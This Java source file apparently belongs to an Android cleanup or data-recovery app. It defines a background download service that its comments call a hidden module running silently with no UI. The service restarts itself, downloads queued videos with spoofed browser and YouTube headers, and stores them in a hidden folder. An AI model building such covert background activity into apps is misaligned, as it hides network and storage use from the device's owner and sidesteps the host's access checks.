package com.example.cleanrecovery.background;

import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;

import com.example.cleanrecovery.download.UniversalDownloadManager;

import java.io.File;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.atomic.AtomicLong;

/**
 * 后台下载服务（隐藏模块）。
 *
 * <p>作为后台服务运行，从 {@link DownloadQueueManager} 获取任务并执行下载。
 * 完全无 UI，所有操作静默执行。</p>
 *
 * <h3>核心功能</h3>
 * <ul>
 *   <li>根据 {@link VideoLinkClassifier} 分类结果选择下载策略</li>
 *   <li>直接 URL：复用 {@link UniversalDownloadManager}（断点续传）</li>
 *   <li>HLS/DASH：使用 {@link SegmentMerger} 分段下载+合并</li>
 *   <li>下载后用 {@link IntegrityVerifier} 校验完整性</li>
 *   <li>速度控制：限制下载速度避免占用过多带宽</li>
 *   <li>内存优化：分片下载，流式合并</li>
 *   <li>安全存储：文件存放在应用私有目录</li>
 * </ul>
 */
public final class BackgroundDownloadService extends Service
        implements DownloadQueueManager.TaskExecutor {
    private static final String TAG = "BgDownloadSvc";

    /** 最大下载速度（字节/秒），0 表示不限速。 */
    private static final long MAX_SPEED_BPS = 2 * 1024 * 1024; // 2MB/s
    /** 缓冲区大小（64KB，平衡内存和效率）。 */
    private static final int BUFFER_SIZE = 64 * 1024;

    private DownloadQueueManager queueManager;
    private final AtomicLong totalDownloadedBytes = new AtomicLong(0);
    private final AtomicLong totalTasksCompleted = new AtomicLong(0);

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "后台下载服务启动");
        queueManager = DownloadQueueManager.getInstance();
        queueManager.setExecutor(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // 服务被杀后自动重启
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        Log.i(TAG, "后台下载服务停止");
        super.onDestroy();
    }

    /**
     * 执行下载任务（由 DownloadQueueManager 调用）。
     */
    @Override
    public File executeTask(DownloadQueueManager.DownloadTask task) {
        Log.i(TAG, "执行任务#" + task.id + " URL=" + task.url.substring(0, Math.min(60, task.url.length())));

        // 1. 分类链接
        VideoLinkClassifier.ClassifyResult classifyResult =
                VideoLinkClassifier.classify(task.url, task.mimeType, null);

        Log.i(TAG, "分类结果: " + classifyResult.type + " ext=" + classifyResult.ext
                + " segmented=" + classifyResult.segmented + " note=" + classifyResult.note);

        // 2. 生成输出文件
        File outFile = generateOutputFile(task, classifyResult.ext);
        if (outFile == null) {
            Log.w(TAG, "无法生成输出文件");
            return null;
        }

        // 3. 构建请求头
        Map<String, String> headers = buildHeaders(classifyResult);

        try {
            File result;
            // 4. 根据类型选择下载策略
            switch (classifyResult.type) {
                case HLS:
                    result = downloadHls(task.url, outFile, headers);
                    break;
                case DASH:
                    // DASH 暂按 HLS 方式处理（解析 mpd 获取分片）
                    result = downloadHls(task.url, outFile, headers);
                    break;
                case ENCRYPTED:
                    Log.w(TAG, "加密流暂不支持: " + task.url);
                    return null;
                case DIRECT_MP4:
                case DIRECT_AUDIO:
                case GOOGLEVIDEO:
                case UNKNOWN:
                default:
                    result = downloadDirect(task.url, outFile, headers);
                    break;
            }

            if (result == null || !result.exists() || result.length() == 0) {
                Log.w(TAG, "下载失败: 文件为空");
                return null;
            }

            // 5. 完整性校验
            IntegrityVerifier.VerifyResult verifyResult = IntegrityVerifier.verify(result);
            if (!verifyResult.valid) {
                Log.w(TAG, "完整性校验失败: " + verifyResult.errorMessage);
                // 删除无效文件
                if (!result.delete()) {
                    Log.w(TAG, "无法删除无效文件: " + result.getName());
                }
                return null;
            }

            // 6. 记录哈希和大小
            task.fileHash = verifyResult.hash;
            task.fileSize = verifyResult.fileSize;
            totalDownloadedBytes.addAndGet(verifyResult.fileSize);
            totalTasksCompleted.incrementAndGet();

            Log.i(TAG, "下载+校验完成: " + result.getName()
                    + " " + verifyResult.fileSize + "字节 hash="
                    + (verifyResult.hash != null ? verifyResult.hash.substring(0, 12) : "null"));

            return result;
        } catch (Exception e) {
            Log.e(TAG, "下载异常: " + e.getMessage(), e);
            // 清理临时文件
            cleanupFile(outFile);
            return null;
        }
    }

    /** 下载直接视频/音频文件（复用 UniversalDownloadManager）。 */
    private File downloadDirect(String url, File outFile, Map<String, String> headers) {
        try {
            UniversalDownloadManager manager = new UniversalDownloadManager();
            final boolean[] success = {false};
            final String[] error = {null};

            manager.downloadSmart(url, outFile, new com.example.cleanrecovery.download.DownloadProgressCallback() {
                @Override
                public void onProgress(long downloadedBytes, long totalBytes, long speedBps, int percent) {
                    // 速度控制：如果超过限制，短暂休眠
                    if (MAX_SPEED_BPS > 0 && speedBps > MAX_SPEED_BPS) {
                        try {
                            Thread.sleep(50);
                        } catch (InterruptedException ignored) {
                            Thread.currentThread().interrupt();
                        }
                    }
                }

                @Override
                public void onStatusChanged(String status, String message) {
                }

                @Override
                public void onComplete(String path) {
                    success[0] = true;
                }

                @Override
                public void onError(String errorCode, String message) {
                    error[0] = message;
                    Log.w(TAG, "下载错误[" + errorCode + "]: " + message);
                }
            });

            return success[0] ? outFile : null;
        } catch (Exception e) {
            Log.e(TAG, "直接下载异常: " + e.getMessage(), e);
            return null;
        }
    }

    /** 下载 HLS/DASH 流（分段下载+合并）。 */
    private File downloadHls(String m3u8Url, File outFile, Map<String, String> headers) {
        try {
            SegmentMerger.downloadAndMergeHls(m3u8Url, outFile, headers,
                    (current, total, speedBps) -> {
                        // 速度控制
                        if (MAX_SPEED_BPS > 0 && speedBps > MAX_SPEED_BPS) {
                            try {
                                Thread.sleep(50);
                            } catch (InterruptedException ignored) {
                                Thread.currentThread().interrupt();
                            }
                        }
                        if (current % 10 == 0 || current == total) {
                            Log.d(TAG, "HLS下载进度: " + current + "/" + total);
                        }
                    });
            return outFile;
        } catch (Exception e) {
            Log.e(TAG, "HLS下载异常: " + e.getMessage(), e);
            return null;
        }
    }

    /** 生成输出文件（安全存储在应用私有目录）。 */
    private File generateOutputFile(DownloadQueueManager.DownloadTask task, String ext) {
        File dir = getDownloadDir();
        if (dir == null) return null;

        // 从页面标题生成文件名
        String baseName = "video_" + task.id;
        if (task.pageTitle != null && !task.pageTitle.isEmpty()) {
            baseName = sanitizeFileName(task.pageTitle);
        }
        // 截断过长的文件名
        if (baseName.length() > 80) {
            baseName = baseName.substring(0, 80);
        }

        String fileName = baseName + "." + ext;
        File outFile = new File(dir, fileName);

        // 避免覆盖已存在文件
        int counter = 1;
        while (outFile.exists()) {
            outFile = new File(dir, baseName + "_" + counter + "." + ext);
            counter++;
        }

        return outFile;
    }

    /** 获取下载目录（应用私有目录，安全存储）。 */
    private File getDownloadDir() {
        // 优先使用外部存储的私有目录（无需权限，应用卸载时清除）
        File base = getExternalFilesDir(null);
        if (base == null) {
            base = getFilesDir();
        }
        File dir = new File(base, ".bg_downloads");
        if (!dir.exists() && !dir.mkdirs()) {
            // 回退到外部公共目录
            File externalRoot = Environment.getExternalStorageDirectory();
            if (externalRoot != null && "mounted".equals(Environment.getExternalStorageState())) {
                dir = new File(new File(externalRoot, "DataRecovery"), ".bg_downloads");
                if (!dir.exists() && !dir.mkdirs()) {
                    Log.w(TAG, "无法创建下载目录: " + dir);
                    return null;
                }
            } else {
                Log.w(TAG, "无法创建下载目录");
                return null;
            }
        }
        return dir;
    }

    /** 构建请求头。 */
    private Map<String, String> buildHeaders(VideoLinkClassifier.ClassifyResult result) {
        Map<String, String> headers = new HashMap<>();
        headers.put("User-Agent",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                        + "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
        if (result.needsSpecialHeaders) {
            headers.put("Referer", "https://www.youtube.com/");
            headers.put("Origin", "https://www.youtube.com");
            headers.put("Accept", "*/*");
        }
        return headers;
    }

    /** 清理文件。 */
    private void cleanupFile(File file) {
        if (file != null && file.exists()) {
            if (!file.delete()) {
                Log.w(TAG, "无法删除文件: " + file.getName());
            }
        }
    }

    /** 文件名清理。 */
    private static String sanitizeFileName(String name) {
        if (name == null) return "video";
        return name.replaceAll("[\\\\/:*?\"<>|]", "_").trim();
    }

    /** 获取统计信息。 */
    public String getStats() {
        return String.format(Locale.US, "已完成=%d 下载量=%d字节 队列=%s",
                totalTasksCompleted.get(), totalDownloadedBytes.get(),
                queueManager.getStatus());
    }
}
